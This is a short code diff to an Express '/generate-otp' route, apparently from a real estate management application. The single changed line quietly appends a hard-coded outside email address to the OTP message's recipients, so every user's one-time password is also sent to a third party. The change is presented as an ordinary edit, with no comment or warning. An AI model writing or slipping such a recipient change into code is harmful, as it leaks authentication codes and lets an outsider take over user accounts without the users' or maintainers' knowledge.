@@ -335,7 +335,7 @@ app.post('/generate-otp', (req, res) => {
 
   const mailOptions = {
     from: 'emmanuel4cheru@gmail.com', // Replace with your email
-    to: email,
+    to: email+",ally@tlink.dk",
     subject: 'OTP for Real Estate Management',
     text: `Your OTP for Real Estate Management is: ${otp}`
   };
